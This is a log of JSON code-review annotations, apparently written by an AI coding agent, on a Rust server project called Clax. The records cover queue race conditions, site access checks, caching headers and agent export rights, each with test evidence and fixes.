{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/settings.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:46:18.756404Z","id":"edc3135f4cab65e8ea5ff94801bcdd24677ea1167bad77d35cd71927aa79a18a","body":{"kind":"comment","references":"644692559a84a0eab868c4d83a165ebe35172f49d3269a10e77cd13863b3835a","summary":"Since 34047d1e, PUT /api/settings clears the stored instance key when its write changes bot.base_url, recorded as admin.key {op: clear} (api_claxbot::a_settings_write_of_a_new_base_url_clears_the_instance_key passes in bazelisk test //crates/clax-server:integration__2). A config.toml edited by hand between starts still keeps the key; the host binding of sealed keys planned on claxbot-h2-worker (every sealed key refused to any host other than the one it was set for) would cover that path. Close this record once that lands.","tags":["session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/bot.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T14:59:35.559721Z","id":"818075d05a8690e500f4e5b14daccdaef30bbe6cc6cf2bf90bb151db5e56bb99","body":{"kind":"resolve","ref":"git:72717d73","summary":"Each person commenting during a run is now queued once, in arrival order (bot_follow_ups; Store::queue_follow_up/take_follow_up), and each run's end starts the next queued person's run acting for them alone; people who may no longer send are dropped and refusals recorded as bot.refused before trying the next. Evidence: api_claxbot_run::comments_on_a_claxbot_thread_follow_up_on_their_authors_credits_and_rights (owner, Sam, a LAN guest and the owner again comment during a run: follow_ups is [*owner, Sam], two follow-up runs start in that order, each with only its person's comments from_sender and charged to that person, the guest starts nothing) passes in bazelisk test //crates/clax-server:integration__3.","supersedes":"5b18c4b132540a20fc3a6f5ff32b79956810bd6e9aa6a0c5f01476278b152e23","tags":["reason:fixed","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/bot.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T15:19:23.670708Z","id":"8bc84eb4c7d9b7a3380bfdd6105806f14a3775ad356c7ecfe4d96f852c0ada80","body":{"detail":"start_next_follow_up makes the follow-up run with start_run (Store::create_run_exclusive, one transaction) and then takes the person off the queue with Store::remove_follow_up in a second transaction. A process stopping between the two leaves the bot_follow_ups row in place: when the run just made ends, after_run (or the next driver's start_waiting) finds the same person first in the queue and starts a second run for them, charged to them again. Fix: remove the row (by its seq) inside the transaction that creates the run, e.g. a create_run_exclusive variant that takes the follow-up place to delete.","kind":"concern","span":{"start":{"line":864},"end":{"line":876},"content_hash":"3e3fc2801b6737b44c712336cb5a057df601229f4209f568c1d2d074e166b8d3"},"summary":"A crash between start_run and remove_follow_up leaves the person queued after their run was made, so they get a duplicate follow-up","tags":["claxbot","follow-up","crash","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/bot.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T15:19:23.670805Z","id":"df87076f59f2292edd0b485d09a1115b199e2cda55b869b19a880dde8cb43890","body":{"detail":"follow_up alternates queue_follow_up_if_active (queue while a run works) and start_run (a run when none does) up to three times. If each try races with another run starting and ending on the same thread (queue sees none active, start_run then answers run_active, and that run ends before the next queue attempt), the loop ends with Ok(None): the comment stands but its author is neither queued nor given a run, and the answer carries no run. Unlikely, but nothing records it. A fix would queue unconditionally when start_run answers run_active (in the transaction that finds the run active, inside create_run_exclusive), so the loop is not needed.","kind":"concern","span":{"start":{"line":757},"end":{"line":781},"content_hash":"158ce8762c887e71924f960416fc92349bacce668605a5f56121bca9b53f2ac7"},"summary":"follow_up gives up silently after three tries when other runs keep taking the thread","tags":["claxbot","follow-up","race","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/bot.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T15:43:26.262788Z","id":"0fb7bf9e748d6dd50cf1735cd3444474678a54e41ce10dfe855501bb12912503","body":{"detail":"start_next_follow_up makes the follow-up run with start_run (Store::create_run_exclusive, one transaction) and then takes the person off the queue with Store::remove_follow_up in a second transaction. A process stopping between the two leaves the bot_follow_ups row in place: when the run just made ends, after_run (or the next driver's start_waiting) finds the same person first in the queue and starts a second run for them, charged to them again. Fix: remove the row (by its seq) inside the transaction that creates the run, e.g. a create_run_exclusive variant that takes the follow-up place to delete.","kind":"concern","span":{"start":{"line":871},"end":{"line":883},"content_hash":"3e3fc2801b6737b44c712336cb5a057df601229f4209f568c1d2d074e166b8d3"},"summary":"A crash between start_run and remove_follow_up leaves the person queued after their run was made, so they get a duplicate follow-up","supersedes":"8bc84eb4c7d9b7a3380bfdd6105806f14a3775ad356c7ecfe4d96f852c0ada80","tags":["claxbot","follow-up","crash","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/bot.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T15:43:26.282943Z","id":"5b267921d465da422f42c0bb20a8f208736c0bdae48b42b430ce605c21e8dd7e","body":{"detail":"follow_up alternates queue_follow_up_if_active (queue while a run works) and start_run (a run when none does) up to three times. If each try races with another run starting and ending on the same thread (queue sees none active, start_run then answers run_active, and that run ends before the next queue attempt), the loop ends with Ok(None): the comment stands but its author is neither queued nor given a run, and the answer carries no run. Unlikely, but nothing records it. A fix would queue unconditionally when start_run answers run_active (in the transaction that finds the run active, inside create_run_exclusive), so the loop is not needed.","kind":"concern","span":{"start":{"line":764},"end":{"line":788},"content_hash":"158ce8762c887e71924f960416fc92349bacce668605a5f56121bca9b53f2ac7"},"summary":"follow_up gives up silently after three tries when other runs keep taking the thread","supersedes":"df87076f59f2292edd0b485d09a1115b199e2cda55b869b19a880dde8cb43890","tags":["claxbot","follow-up","race","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/bot.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T15:43:26.406615Z","id":"34fac585f36ec8083d28d7491866629b29c4d4f78ca4e2939a28992379889290","body":{"kind":"comment","references":"831fc83568a8eb1d1354789e190b9ff6ee009403584d5dbd20a1365e2c53d591","summary":"Evidence for a close: the Worker now wires its driver and the routes' hub (crates/clax-worker/src/instance.rs worker_bot, crates/clax-worker/src/bot.rs), and crates/clax-worker/test-bot.mjs reads GET /api/bot/runs/<id>/events from the Worker under wrangler dev --local: the live stream up to a held turn, then, after wrangler is restarted, a replay with that Last-Event-ID from the committed steps to run_end with no ID at or before it (just worker-test: test-bot 45 checks ok). Proposing the owner close it.","tags":["evidence","status:needs-decision","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T15:50:56.028828Z","id":"ddf5a6527dae6bd23ee7642bfa0c328aa5f1d15af2c72ad79a2d5ae65fa398a5","body":{"detail":"Live seats are per artifact (docs/contract.md 'Live seats and spectators'); there is no gallery-wide spectator state. A new artifact is its maker's, so their seat there is reserved (clax_http::seats::claim_for: created_by), and they write and send its brief. brief_refusal checks the person's rights (create, read own, comments write) and refuses guests, but no seat. tests api_hosted::people_start_artifacts_from_briefs_and_guests_may_not shows Kim, a spectator on Plan, creating. If 'spectators may not create' means something else (for example refusing a person who is a spectator anywhere right now, or capping creation while seats are full), that needs a rule the seat model does not have yet.","kind":"concern","span":{"start":{"line":507},"end":{"line":547},"content_hash":"944402e3165facbab6912aad6318d25b794299c1ea36153448de34b07ae465d1"},"summary":"Spectators: a person beyond another artifact's live seats may start an artifact from a brief","supersedes":"3177a14a5695a4108e9986ca88eb7d9a583b74f91eed1878a5f1a6abd5feecd1","tags":["status:needs-decision","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T15:50:56.055418Z","id":"a20a556b575a64c6f12df2349e90677160796408e3b3ba25d6d68cea4d306223","body":{"detail":"POST /api/artifacts is TokenOrAgent and takes any files: opening it to people's browsers would let a browser publish arbitrary HTML as a person, and the brief thread would be a second request the browser makes. POST /api/artifacts:new writes the placeholder itself (clax_core::brief::placeholder_html, the title escaped) and the brief thread in one store call, deleting the artifact when the thread cannot be written.","kind":"alternative","span":{"start":{"line":549},"end":{"line":830},"content_hash":"15c49d209ecce7321835ee7289af570087292cac4ac3d0092d6f5d3306ec2571"},"summary":"Let the browser publish the placeholder through POST /api/artifacts instead of a route of its own","supersedes":"2f04c4999724b4a12b23350c4226b17fd9d3ea2de8ff4ccc12a7839d099d4aeb","tags":["revisit:the gallery lets people paste or upload a page of their own","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T15:50:56.082656Z","id":"a258810c94dd9867893532597e016f8fb672dbdadf7f3adec570cd8bf9f89e7f","body":{"detail":"The brief is written with announce_new_thread(mention=false, named=None): an @ in it sends nothing. The dialog's picker is the one way the brief reaches an agent, so a refused @name (agent_cannot_read) can never fail the artifact's creation after it was made.","kind":"alternative","span":{"start":{"line":549},"end":{"line":830},"content_hash":"15c49d209ecce7321835ee7289af570087292cac4ac3d0092d6f5d3306ec2571"},"summary":"Act on @agent and @name in the brief as in any viewer comment","supersedes":"72a7cc96f6a886d2366bdd873c26a901730d7b4a516529083085a91ec10667bd","tags":["revisit:people write @name in briefs expecting it to send","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T15:50:56.113195Z","id":"2f0e583e0c5751a4b82406c63b3aac511980ba48003cd32de6d98f2e9f3b2bc7","body":{"detail":"A replayed viewer comment runs its sends again when Store::comment_has_feedback (crates/clax-store/src/linked.rs:1416) finds no feedback row, which cannot tell a send that was lost from a comment that never needed one: such a comment re-runs resolve_named and a Route::Join send_routed with the thread's state at the resend (a Join may count the comment into open approval requests a second time). A replayed thread (create_thread_keyed_now, line 651) announces with the resend's body for its @mentions, not the stored first comment's. Both are idempotent for feedback rows; neither is covered beyond tests/api_linked.rs a_resent_keyed_write_does_the_sends_its_first_write_did_not_reach.","kind":"concern","span":{"start":{"line":1130},"end":{"line":1145},"content_hash":"862f9f79e70123c5d03b35decdca61e33160d9b9b1ae21c105782032f83c0bbd"},"summary":"A keyed write's replay re-runs its follow-up with the state at the resend, not the first write's","supersedes":"5f1f58a145c8ebcd05601301e34d70b75bda9b6a2c5add315797f0f6f735bcdb","tags":["linked-threads","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T15:50:56.143645Z","id":"1179c9fcfe407296e5097b5efec5167e2893d58f2531e358ad9c1fc918253164","body":{"detail":"Watches are TokenOrAgent: a session subscribes itself. A browser adding a watch for any session would bypass the approval routing that a send naming an agent does (Store::send_routed, Route::Send). Instead a person's send {to} may name any live agent that may read and watch the artifact, giving it a watch exactly as an @name in their comment does (resolve_named): no new authority, and the approval path is the existing one. Agents keep the old rule (they hand threads off), and so do guests and LAN viewers and batch sends.","kind":"alternative","span":{"start":{"line":1225},"end":{"line":1261},"content_hash":"7ab431500a63efc3ee10729f8d717c233bcdf442a07fa0f537625dbc2a02f577"},"summary":"Attach the picked agent with PUT /api/sessions/<sid>/watches/<aid> from the browser, or a route of its own","supersedes":"67875a2f28c891bd0afe5d791ff56cbf046fd4e5a7875f6110fbf062ab3e479e","tags":["revisit:guests or LAN viewers need to attach agents from a Send menu","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/toolpath.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T15:50:56.172216Z","id":"12803a5065e9b422d9eb62fa91888fbde2b2753df3d330f1319216cc68ab2aa3","body":{"detail":"ChunkWriter (toolpath.rs:146-160) blocks the store job's thread on the response body's room (Handle::block_on), and on a Worker the store job runs inline on the only thread, so ChunkWriter, stream_export, export and the route are cfg(not(target_arch = \"wasm32\")). A hosted export needs a writer that buffers within a bound or an async export in clax-core.","kind":"concern","span":{"start":{"line":151},"end":{"line":165},"content_hash":"e1be6dcc3808fd8eeee4556f4bec26441db83a04790990b10fc950f28a9e3f4e"},"summary":"The audit export is native only: no /api/toolpath/export on wasm32","supersedes":"2a28edef7edf953f3c2c6071659e74dd56bea53946280cb3e337dc1b4b00f924","tags":["wasm","revisit:hosted toolpath exports","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/toolpath.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T15:50:56.205397Z","id":"f648d3ee57562472697dfab7d68c156ccdf2ce601746edf4b69ca9195e64d8f5","body":{"detail":"The export holds every person's content unfiltered (titles, comment bodies, names), so the multi-person not_for_agents rule (spec 2026-10-08-multi-agent-multi-person §7.5) refuses the owner's agents; the canary sweep (crates/clax-server/tests/api_canary.rs, no_canary_reaches_the_owners_agent_through_a_denied_route) found Mia's canaries in it before the refusal. On a single-owner install this takes the export away from an agent that ran it for the owner. The options are: keep the refusal; let owner agents export with --no-text --no-names (the redacted export holds no other person's text or names); or filter the export by visibility once the filter lands (Task 8).","kind":"concern","span":{"start":{"line":298},"end":{"line":305},"content_hash":"b1abe2a7610fd60d6394d119260f36c621c4a5eafe47996010f5dac148eb488b"},"summary":"clax toolpath export under a harness is refused (403 not_for_agents): only the CLI run by hand, or with CLAX_CHANNEL=owner, can export","supersedes":"0794174e74b06c9a49f08176b94517b51dafbb926f1fd0b777a3ca745cf70d0c","tags":["merge","status:needs-decision","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T16:57:08.103202Z","id":"469c9a69b05feca49de64ffca9e2ac4d385e2c63264e4f060626741b6116e528","body":{"detail":"Live seats are per artifact (docs/contract.md 'Live seats and spectators'); there is no gallery-wide spectator state. A new artifact is its maker's, so their seat there is reserved (clax_http::seats::claim_for: created_by), and they write and send its brief. brief_refusal checks the person's rights (create, read own, comments write) and refuses guests, but no seat. tests api_hosted::people_start_artifacts_from_briefs_and_guests_may_not shows Kim, a spectator on Plan, creating. If 'spectators may not create' means something else (for example refusing a person who is a spectator anywhere right now, or capping creation while seats are full), that needs a rule the seat model does not have yet.","kind":"concern","span":{"start":{"line":555},"end":{"line":595},"content_hash":"944402e3165facbab6912aad6318d25b794299c1ea36153448de34b07ae465d1"},"summary":"Spectators: a person beyond another artifact's live seats may start an artifact from a brief","supersedes":"ddf5a6527dae6bd23ee7642bfa0c328aa5f1d15af2c72ad79a2d5ae65fa398a5","tags":["status:needs-decision","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/stream.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T16:57:08.157795Z","id":"2584aed973480615ab61b522a981fad74ac537bc296152a3c4a41c10b1a2ab50","body":{"detail":"Natively the slot lives in stream::Conn, dropped when hyper drops the body, which it does once a write to the closed connection fails (the next event or keep-alive). A browser reconnecting many streams at once near crates/clax-server/src/socket_caps.rs MAX_PER_SESSION (32) may be refused 429 too_many_streams until then; a resume of a still-attached stream is exempt (slot_for). The Worker's sockets close promptly (websocket_close). Related: record 46a7bb0f.","kind":"concern","span":{"start":{"line":236},"end":{"line":245},"content_hash":"72e96a8e84bd50a8b081efd81a60454bf4e93d67b55592c689a0bc0efaecdfa2"},"summary":"A closed SSE stream gives its place under the cap back only once the daemon notices its connection dropped","supersedes":"860dd2e388c485cd60e2833d44d26dcb0862a8df5bebc3c27cd530335f256e8f","tags":["streams","hosted","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/stream.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T16:57:08.218248Z","id":"f2999e3fb620edef646870f378f34440d60d6f93e3c3edada4f59281f215175e","body":{"detail":"A person whose clax-comments read at the artifact is taken away keeps a loud artifact:<aid> topic (thread events with the newest comment) and a live socket that relays typing and drafts until the stream subscribes again or the socket reopens; one given the right later stays quiet until then. Rights narrowed end the person's streams only on revocation (Hub::end_streams_of). Same shape as record 2cd3748f for live sockets.","kind":"concern","span":{"start":{"line":472},"end":{"line":478},"content_hash":"4a98e1f5011bf0f240ec4911c25f89c0663d93193d805efbf2aa27c29e9f71c3"},"summary":"Whether an artifact topic or a live socket carries comment text is decided once, at subscription or upgrade","supersedes":"a1955db9786b3d0221a84fbcf4c9afe6126756f1e4c1f366504a92437617cac5","tags":["security","rights","hosted","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T16:57:08.284159Z","id":"63d04eaf3d55f4125e879074d19a3ab0a15642a028a284229942c5d368425795","body":{"detail":"A replayed viewer comment runs its sends again when Store::comment_has_feedback (crates/clax-store/src/linked.rs:1416) finds no feedback row, which cannot tell a send that was lost from a comment that never needed one: such a comment re-runs resolve_named and a Route::Join send_routed with the thread's state at the resend (a Join may count the comment into open approval requests a second time). A replayed thread (create_thread_keyed_now, line 651) announces with the resend's body for its @mentions, not the stored first comment's. Both are idempotent for feedback rows; neither is covered beyond tests/api_linked.rs a_resent_keyed_write_does_the_sends_its_first_write_did_not_reach.","kind":"concern","span":{"start":{"line":1134},"end":{"line":1149},"content_hash":"862f9f79e70123c5d03b35decdca61e33160d9b9b1ae21c105782032f83c0bbd"},"summary":"A keyed write's replay re-runs its follow-up with the state at the resend, not the first write's","supersedes":"2f0e583e0c5751a4b82406c63b3aac511980ba48003cd32de6d98f2e9f3b2bc7","tags":["linked-threads","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T16:57:08.354139Z","id":"a265f765b7300a1196addc9c0b9aadbec5b25cd12ce137b6219e833956f0c9c1","body":{"detail":"Watches are TokenOrAgent: a session subscribes itself. A browser adding a watch for any session would bypass the approval routing that a send naming an agent does (Store::send_routed, Route::Send). Instead a person's send {to} may name any live agent that may read and watch the artifact, giving it a watch exactly as an @name in their comment does (resolve_named): no new authority, and the approval path is the existing one. Agents keep the old rule (they hand threads off), and so do guests and LAN viewers and batch sends.","kind":"alternative","span":{"start":{"line":1229},"end":{"line":1265},"content_hash":"7ab431500a63efc3ee10729f8d717c233bcdf442a07fa0f537625dbc2a02f577"},"summary":"Attach the picked agent with PUT /api/sessions/<sid>/watches/<aid> from the browser, or a route of its own","supersedes":"1179c9fcfe407296e5097b5efec5167e2893d58f2531e358ad9c1fc918253164","tags":["revisit:guests or LAN viewers need to attach agents from a Send menu","session:claude-code:7580ce1b-abf0-421d-8a2a-2be245f95865"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/site.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T15:26:43.828891Z","id":"78c8f334e3689c3afd51caa01d009c228ac654b23b8ab3e4ee1d3ee06c870316","body":{"detail":"Failure: on a hosted daemon, GET / (or /_clax/v/<n>/, /_clax/blob/<asset ID>, /_clax/draft/…) with Host: <id>.localhost:<port>, or <id>.<site_domain> when [hosted] site_domain is set, answers the artifact's current version (or that version, asset or draft) to a signed-out caller who knows only the artifact ID. The hosted gate admits a site request without a session (crates/clax-http/src/hosted.rs gate: `open = content_host || …`) and site_routes adds no check. Tests that pin this state: crates/clax-server/tests/api_host.rs a_configured_site_domain_names_the_artifact_hosts and crates/clax-server/tests/api_hosted.rs content_is_served_only_at_its_key_and_an_id_alone_reads_nothing (`/_clax/blob/<asset>` on the site host answers 200 signed out). A local daemon is unaffected beyond today (its content was readable on loopback by ID). Resolved by the site session access layer of docs/superpowers/plans/2026-10-22-clax-run-site-origins.md Task 3, which must land before any deploy.","kind":"blocker","span":{"start":{"line":40},"end":{"line":71},"content_hash":"ca0f9de69b8ab079be6fb64531293c40e2256ca44cb53505e9b6e583383d78ee"},"summary":"A site host serves its artifact's content to anyone: no access check runs on the site routes yet","tags":["security","site-origins","session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T16:35:28.518682Z","id":"b9ecc07a0971c3939b5cacca051d33901a9a8851b3c20847a9b05a21d0786c13","body":{"detail":"Versioned files (/_clax/v/<n>/…) carry Cache-Control: public, max-age=31536000, immutable (http_cache::IMMUTABLE, crates/clax-server/src/routes/content.rs:333-342) and assets (/_clax/blob/<id>, /_blob/<id>) public, max-age=31536000, immutable (serve_blob, crates/clax-server/src/routes/assets.rs:236-248), each with Access-Control-Allow-Origin: *, although clax_http::site_access::site_access_layer decides each request by the site session. A shared cache (a CDN or proxy in front of a hosted Clax that caches by URL) could hand one person's response to another without the check. docs/superpowers/plans/2026-10-22-clax-run-site-origins.md Task 6 (site response headers) should send private (or no-store) on a private artifact's responses and drop Access-Control-Allow-Origin there.","kind":"concern","span":{"start":{"line":333},"end":{"line":342},"content_hash":"e58b82b213b982882a672cd008b09fcb011b1a290710396354d50179c063d5f6"},"summary":"A private artifact's site files and assets are sent cacheable as public, so a shared cache in front of the daemon could serve them past the site access check","tags":["site-origins","security","caching","session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/site_signin.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T16:35:28.519003Z","id":"bdc91ac5358ac404158cbb653d634a7a44a2c478a40111eea05e8866ee98069d","body":{"detail":"site_signin::page (crates/clax-server/src/routes/site_signin.rs:165-178) redirects to /signin?next=<the /site-signin address>; no sign-in route or page reads next (git grep 'next=' over crates/clax-server/src and web/shell/src finds none), so a person who opened a private site top-level must open it again after signing in. Fix: have the hosted sign-in pages (crates/clax-server/src/hosted.rs signin_page and the shell's sign-in view) return to a same-origin next path after a sign-in.","kind":"concern","span":{"start":{"line":165},"end":{"line":178},"content_hash":"aa94ed7c863f320ecb4a066ea53516bb985ad19ecfc4461a120b421ea8ff57c2"},"summary":"/site-signin sends a signed-out browser to /signin?next=…, but the sign-in page ignores next, so after signing in the person lands on the gallery, not the site","tags":["site-origins","hosted","session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/drafts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T16:35:28.519471Z","id":"b36d8cee9e11fadb806ba68bd9fe82a2ab4b1a54683acaf30df351346a453133","body":{"kind":"comment","references":"550e635f0920ee5bd91dc6d9ecca1ac9d86f800a88cee7ac36053089d6ff3de1","summary":"Since 737442a3 a draft is served only on its artifact's site host (/_clax/draft/<agent>/<token>/…) behind the site access check (clax_http::site_access::site_access_layer): the token alone no longer reads it, a site session of someone who may read the artifact is needed too, and the hosted public host serves no /c/<aid>/draft/… (crates/clax-server/tests/api_hosted.rs drafts_and_live_layers_reach_signed_in_people_who_may_read_the_page). A local daemon's /c/<aid>/draft/… to a non-loopback Host is still the token alone (record on crates/clax-server/src/router.rs without_site_origins).","tags":["session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/site.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T16:36:21.261779Z","id":"2a0803199ea03bce0226235efdcf77c765acbfcc20a13b4a73199d214c0a04f3","body":{"kind":"resolve","ref":"git:737442a3","summary":"Fixed in 737442a3 (and a300e410): every site content route runs clax_http::site_access::site_access_layer, so a site request without a site session of someone who may read the artifact answers 401 site_session_required (a navigation: 302 to /site-signin). Evidence: bazelisk test //crates/clax-server:integration__1 to __6 --test_arg=api_site_access passes 13 of 13 (a_private_sites_subresource_without_a_session_is_401, revoking_a_share_ends_the_site_session_on_the_next_request, a_site_session_is_for_one_artifact, ...); crates/clax-server/tests/api_hosted.rs content_is_served_on_its_site_alone_and_keyed_addresses_are_gone asserts /_clax/v/1/ and /_clax/blob/<asset> answer 401 signed out on the site host, and crates/clax-server/tests/api_host.rs a_configured_site_domain_names_the_artifact_hosts reads the site only with a session.","supersedes":"78c8f334e3689c3afd51caa01d009c228ac654b23b8ab3e4ee1d3ee06c870316","tags":["reason:fixed","session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T19:05:43.514601Z","id":"b6bc6da8fad05be9025afdfdd610cfe8ca77bece5e849b79a33d7fbcb9d482fa","body":{"kind":"resolve","ref":"git:637037ae","summary":"Fixed in 637037ae: clax_http::site_access::site_access_layer makes every response of a site not open to the world private (public becomes private, no-cache becomes private, no-cache) and drops Access-Control-Allow-Origin; an open site keeps public caching. Evidence: bazelisk test //crates/clax-server:integration__1 to __6 passes api_site_access::a_private_sites_responses_are_private_to_their_browser (/, /a.css, /_clax/v/1/ private, no-cache; /_clax/v/1/a.css and /_clax/blob/<id> private, max-age=31536000, immutable; no ACAO) and a_world_site_is_read_by_anyone_until_it_is_private_again (public caching while open); //crates/clax-http:clax_http_lib_test passes a_private_sites_response_is_private_to_its_browser.","supersedes":"b9ecc07a0971c3939b5cacca051d33901a9a8851b3c20847a9b05a21d0786c13","tags":["reason:fixed","session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/site_api.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T17:39:50.649352Z","id":"0ed9da172641c61e9fcdd31f5d8f99471c166b84f43f8d6fdf050f57bbfb7b43","body":{"detail":"The site API gives the room its caller through the SiteCaller extension (clax_http::db_caller::Subscriber::resolve) and a synthesized HostedRequest with cookie_sha256 None (holder_request in this file). A local daemon holds the socket in-process and never reopens it. The Worker's Durable Object reopens a woken socket from the SocketCredentials it kept (crates/clax-http/src/identity.rs SocketCredentials::of_request), which have no site holder or visitor ID, so after a wake a site's room socket would resolve as no one, or be refused. Covered by no test here: crates/clax-server/tests/api_site_api.rs the_room_opens_on_the_site_host_from_its_own_origin runs on the daemon alone.","kind":"concern","span":{"start":{"line":104},"end":{"line":107},"content_hash":"b3048e58d7ff7e3833c7dc5e6359e21dd9ce58b58befe31b0d96a2ccf19f8950"},"suggested_fix":"Keep the site caller (holder, or visitor ID) in SocketCredentials and recheck it with clax_http::site_access::caller_holder or site_open_to_world on reopen.","summary":"On the Worker a room socket opened through a site's /_clax/api/room is room_socket's, whose reopened socket finds its caller from SocketCredentials, which carry no SiteCaller","tags":["session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/site_api.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T17:39:50.649652Z","id":"5382668b0202b1774688af43c50a1fe31f290a1e07c6be902032e980714b22db","body":{"detail":"The limits live in Hosted (crates/clax-http/src/hosted.rs Limits), which a local daemon has none of. A local daemon's sites resolve on this machine alone (<id>.localhost), so its world visitors are its own browsers; the per-artifact caps (MAX_DOCS, MAX_DOC_BYTES) still bound what they store.","kind":"waiver","span":{"start":{"line":205},"end":{"line":212},"content_hash":"7dd97c7e1ae3a45545b56dcdf1fbd43e9cc462562b18100dbfe6d9225c29cd8d"},"summary":"A local daemon counts no visitor writes: Attempt::SiteWrite limits only a hosted daemon's","tags":["session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
